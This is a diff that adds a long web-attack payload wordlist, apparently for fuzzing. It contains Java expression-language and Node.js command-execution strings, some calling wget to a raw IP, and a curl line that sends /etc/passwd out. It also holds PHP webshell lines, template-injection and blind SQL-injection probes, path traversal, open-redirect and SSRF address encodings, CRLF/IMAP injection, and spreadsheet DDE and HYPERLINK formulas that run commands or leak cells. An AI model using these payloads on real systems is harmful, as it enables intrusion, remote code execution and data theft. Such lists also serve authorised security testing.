@@ -1,1 +1,352 @@
-a
+password.jsp%00
+password.jsp%01
+password.jsp%02
+password.jsp%03
+password.jsp%04
+password.jsp%05
+password.jsp%06
+password.jsp%07
+password.jsp%08
+password.jsp%09
+password.jsp%10
+password.jsp%11
+index.js%70
+snoop%252ejsp
+login.JsP
+login.jsp%20
+%3f.js
+%5cadmin/
+%00admin/
+%2eadmin/
+%2fadmin/
+${T(java.lang.Runtime).getRuntime().exec([ls])
+${T(java.lang.Runtime).getRuntime().exec(['ls'])
+${T(java.lang.Runtime).getRuntime().exec(["ls"])
+${T(java.lang.Runtime).getRuntime().exec([;ls])
+${T(java.lang.Runtime).getRuntime().exec([|ls])
+${T(java.lang.Runtime).getRuntime().exec([ls;])
+${T(java.lang.Runtime).getRuntime().exec[;"ls"]
+${T(java.lang.Runtime).getRuntime().exec[|"ls"]
+${T(java.lang.Runtime).getRuntime().exec["ls"]
+${T(java.lang.Runtime).getRuntime().exec['ls']
+${T(java.lang.Runtime).getRuntime().exec[ls]
+${T(java.lang.Runtime).getRuntime().exec{{ls}}
+${T(java.lang.Runtime).getRuntime().exec{ls}
+${T(java.lang.Runtime).getRuntime().exec('wget%2010.246.17.34:8000')-'
+${T(java.lang.Runtime).getRuntime().exec('wget+10.246.17.34:8000')-'
+${T(java.lang.Runtime).getRuntime().exec('wget'+'10.246.17.34:8000')-'
+${T(java.lang.Runtime).getRuntime().exec('wget+"10.246.17.34:8000")-'
+${T(java.lang.Runtime).getRuntime().exec("wget"+"10.246.17.34:8000")-'
+${T(java.lang.Runtime).getRuntime().exec('wget%2010.246.17.34:8000')-'
+${T(java.lang.Runtime).getRuntime().exec('wget 10.246.17.34:8000')-'
+${T(java.lang.Runtime).getRuntime().exec(wget 10.246.17.34:8000)-'
+${T(java.lang.Runtime).getRuntime().exec("wget 10.246.17.34:8000")-'
+calc.exe${T%28java.lang.Runtime%29.getRuntime%28%29.exec%28toString%28%29.substring%28112,120%29%29}
+${T(java.lang.Runtime).getRuntime().exec("ls")}
+X-Forwarded-Host: www.google.com
+X-Forwarded-Host: //google.com
+X-Forwarded-Host: google.com
+Runtime.class.getMethod(“getRuntime”).invoke(null).exec('ls')
+Runtime.class.getMethod(“getRuntime”).invoke(null).exec("ls")
+Runtime.class.getMethod(“getRuntime”).invoke(null).exec(/ls/)
+Runtime.class.getMethod(“getRuntime”).invoke(null).exec(ls;)
+Runtime.class.getMethod(“getRuntime”).invoke(null).exec(|ls|)
+Runtime.class.getMethod(“getRuntime”).invoke(null).exec(&ls&)
+Runtime.class.getMethod(“getRuntime”).invoke(null).exec('ls;')
+Runtime.class.getMethod(“getRuntime”).invoke(null).exec("ls";)
+Runtime.class.getMethod(“getRuntime”).invoke(null).exec(/ls/;)
+Runtime.class.getMethod(“getRuntime”).invoke(null).exec(&ls;)
+Runtime.class.getMethod(“getRuntime”).invoke(null).exec(|ls;)
+Runtime.class.getMethod(“getRuntime”).invoke(null).exec(&ls|)
+Runtime.class.getMethod(“getRuntime”).invoke(null).exec(ls)
+Runtime.class.getMethod(“getRuntime”).invoke(null).exec(;ls)
+Runtime.class.getMethod(“getRuntime”).invoke(null).exec('ls;)
+Runtime.class.getMethod(“getRuntime”).invoke(null).exec(&ls)
+Runtime.getRuntime().exec('ls')
+Runtime.getRuntime().exec("ls")
+Runtime.getRuntime().exec(/ls/)
+Runtime.getRuntime().exec(ls;)
+Runtime.getRuntime().exec(|ls|)
+Runtime.getRuntime().exec(&ls&)
+Runtime.getRuntime().exec('ls;')
+Runtime.getRuntime().exec("ls";)
+Runtime.getRuntime().exec(/ls/;)
+Runtime.getRuntime().exec(&ls;)
+Runtime.getRuntime().exec(|ls;)
+Runtime.getRuntime().exec(&ls|)
+Runtime.getRuntime().exec(ls)
+Runtime.getRuntime().exec(;ls)
+Runtime.getRuntime().exec('ls;)
+Runtime.getRuntime().exec(&ls)
+a$(bash%20-c%20'(echo;ls)%201>%262')Img.jpg
+a$([ls]).jpg
+([ls])
+(['ls'])
+(["ls"])
+([;ls])
+([|ls])
+([ls;])
+[;"ls"]
+[|"ls"]
+["ls"]
+['ls']
+[ls]
+{{ls}}
+{ls}
+{cat,/etc/passwd}
+'-require('child_process').exec('wget%20IP')-'
+'-require('child_process').exec('wget+IP')-'
+'-require('child_process').exec('wget'+'IP')-'
+'-require('child_process').exec('wget+"IP")-'
+'-require('child_process').exec("wget"+"IP")-'
+'-require('child_process').exec('wget%20IP')-'
+'-require('child_process').exec('wget IP')-'
+'-require('child_process').exec(wget IP)-'
+'-require('child_process').exec("wget IP")-'
+y'-require('child_process').exec('curl+-F+"x=`cat+/etc/passwd`"+IP')-'
+||`id`||
+||`ls`||
+||`id`
+||`ls`
+{}phpinfo();/*
+\{}phpinfo();/*
+\Fields1{}phpinfo();/*
+*/?><?php echo `/bin/cat /etc/passwd`; ?>
+<?php echo "/bin/cat /etc/passwd"; ?>
+;id;
+|${a-cat /etc/passwd}
+;/*in/cat /etc/passwd
+|${IFC}cat etc/passdw
+|${IFC}cat /etc/passdw
+|${IFC}cat ../../../../etc/passdw
+8.8.8.8|${IFC}cat /etc/passdw
+8.8.8.8|${IFC}cat ../../../../etc/passdw
+${IFS}&&echo${IFS}$USER
+${("id")}
+${(;id)}
+${"id"}
+${';id}
+${('id')}
+${(id)}
+${'id'}
+${id}
+${craft.config.get('password','db')}
+${USER_KEY}
+{("id")}
+{(;id)}
+{"id"}
+{';id}
+{('id')}
+{(id)}
+{'id'}
+{id}
+{craft.config.get('password','db')}
+${pf.server.default.dir}
+${{("id")}}
+${{(;id)}}
+${{"id"}}
+${{';id}}
+${{('id')}}
+${{(id)}}
+${{'id'}}
+${{id}}
+${{craft.config.get('password','db')}}
+${USER_KEY}
+{{("id")}}
+{{(;id)}}
+{{"id"}}
+{{';id}}
+{{('id')}}
+{{(id)}}
+{{'id'}}
+{{id}}
+{{craft.config.get('password','db')}}
+';?><?php echo passthru('/bin/cat /etc/passwd');'
+<?php exec($_GET['cmd']); ?>" 
+<?php%20exec($_GET['cmd']);%20?>" 
+%60id%60
+docId:"1 and (select substring(@@version,1,1))='M'" - true
+docId:"1 and (select substring(@@version,2,1))='i'" - true
+docId:"1 and (select substring(@@version,3,1))='c'" - true
+docId:"1 and (select substring(@@version,22,1))='2'"
+docId:"1 and (select substring(@@version,23,1))='0'"
+docId:"1 and (select substring(@@version,24,1))='0'"
+docId:"1 and (select substring(@@version,25,1))='8'"
+wrtz{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}zzzz
+{{ [].class.base.subclasses() }} 
+{{''.class.mro()[1].subclasses()}} 
+{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
+{{ '7'*7 }}
+..././..././..././..././
+..././..././..././..././c:/boot.ini
+..././..././..././..././etc/passwd  
+..././..././..././..././c:/install.ini
+'=ls
+%27=ls
+,%27=ls
+?,%27=ls
+//127.0.00
+Ly8xMjcuMC4wMA%3d%3d
+//8.8.8.8
+feed:feed:javAscript:javAscript:feed:alert
+feed:http//www.google.com:javascript:alert(1);/
+feed:data:text/html,%3cscript%3ealert%281%29%3c/script%3e
+feed:data:text/html,&#x3c;script>alert
+feed:
+feed:https://goo.gl
+Ly84LjguOC44
+127.0.00
+MTI3LjAuMDA%3d
+8.8.8.8
+OC44LjguOA%3d%3d 
+=2*10
+1 and benchmark(20000000,sha1(1))--
+\%09/@example.com
+https://y.com///host.com
+aHR0cHM6Ly95LmNvbS8vL2hvc3QuY29t
+/\google.com
+L1xnb29nbGUuY29t
+////google.com
+Ly8vL2dvb2dsZS5jb20%3d
+///www.google.com/%2f%2e%2e
+////google.com
+///google.com
+//google.com
+/google.com
+//////////www.google.com/%2e%2e
+////////www.google.com/%2e%2e
+///////www.google.com/%2e%2e
+//////www.google.com/%2e%2e
+/////www.google.com/%2e%2e
+////www.google.com/%2e%2e
+////www.google.com/%2e%2e
+///www.google.com/%2e%2e
+//www.google.com/%2e%2e
+/www.google.com/%2e%2e
+//////////www.google.com/
+////////www.google.com/
+///////www.google.com/
+//////www.google.com/
+/////www.google.com/
+////www.google.com/
+////www.google.com/
+///www.google.com/
+//www.google.com/
+/www.google.com/
+//////////www.google.com
+////////www.google.com
+///////www.google.com
+//////www.google.com
+/////www.google.com
+////www.google.com
+////www.google.com
+///www.google.com
+//www.google.com
+/www.google.com
+%252567%252569%252573%2525674
+%252567%252569%252573%2525674.
+127.0.0.1
+127.0.0.1\x0Alololololol
+8.8.8.8\x0Alololololol
+google.com\x0Alololololol
+127.0.0.1\x0Blololololol
+8.8.8.8\x0Blololololol
+google.com\x0Blololololol
+127.0.0.1\x0Clololololol
+8.8.8.8\x0Clololololol
+google.com\x0Clololololol
+127.0.0.1%0Alololololol
+8.8.8.8%0Alololololol
+google.com%0Alololololol
+127.0.0.1%0Blololololol
+8.8.8.8%0Blololololol
+google.com%0Blololololol
+127.0.0.1%0Clololololol
+8.8.8.8%0Clololololol
+google.com%0Clololololol
+216.58.53572
+0xD8.072.53572
+3627733316
+0330.3854660
+\x0B\uff20youtube.com
+%0B\uff20youtube.com
+http://74.0x7d.023.99
+http:74.0x7d.023.99
+74.0x7d.023.99
+74.8196963
+http:74.8196963
+https://74.8196963
+http://example.com\@coredump.cx/
+http://example.com;.coredump.cx/
+jar:http://www.example.com/archive.jar!/resource.html
+http://example.com;URL=javascript:alert(1)
+{u+202e here}sutats-revres
+%e2%80%aesutats-revres
+//////server-status
+/////server-status
+////server-status
+///server-status
+//server-status
+/server-status
+about:addons
+about:app-manager
+about:bloat
+about:blocked
+about:buildconfig
+about:cachef
+about:cache?device=memory
+about:cache?device=disk
+about:cache?device=offline
+about:cache-entry
+about:certerror
+about:config
+about:crashes
+about:credits
+about:downloads
+about:feeds
+about:healthreport
+about:home
+about:jetpack
+about:licence
+about:license
+about:logo
+about:memory
+about:mozilla
+about:neterror
+about:newtab
+about:permissions
+about:plugins
+about:preferences
+about:privatebrowsing
+about:rights
+about:robots
+about:sessionrestore
+about:startpage
+about:support
+about:sync-tabs
+about:webrtc/.\.\../.\.\../.\.\../google.com
+Ly5cLlwuLi8uXC5cLi4vLlwuXC4uL2dvb2dsZS5jb20%3d
+/.\.\../.\.\../.\.\../
+NOTEXIST%2522%0d%0a0003%20CREATE%20%2522INBOX.test
+NOTEXIST%22%0d%0a0003%20CREATE%20%22INBOX.test
+NOTEXIST"%0d%0a0003%20CREATE%20"INBOX.test
+BODY[HEADER]%0d%0aZ900 CAPABILITY%0d%0aZ901 FETCH 1
+1 BODY[HEADER]%0d%0aZ900 CAPABILITY%0d%0aZ901 FETCH 1
+%0D-3+3+cmd|' /C calc'!D2
+%0A-3+3+cmd|' /C calc'!D2
+";=cmd|' /C calc'!A5"
+=cmd|'/k ipconfig'!A0
+-cmd|'/k ipconfig'!A0
+"=cmd|'/k ipconfig'!A0"
+=(cmd|'/k ipconfig'!A0)
+=0-cmd|'/k ipconfig'!A0
++cmd|'/k ipconfig'!A0
+""=CMD|'/k ipconfig'!A0
+@SUM(cmd|'/k ipconfig'!A0)
+%3Dcmd|' /C calc'!A0
+=cmd|' /C calc'!A0
+%3DDDE("cmd";"/C calc";"__DdeLink_60_870516294")
+=DDE("cmd";"/C calc";"__DdeLink_60_870516294")
+%3DHYPERLINK("http://google.com/?leak="&A1&A2, "Error: please click for further information")
+=HYPERLINK("http://google.com/?leak="&A1&A2, "Error: please click for further information")
+';echo exec("c:\\Windows\\system32\\calc.exe");'';';
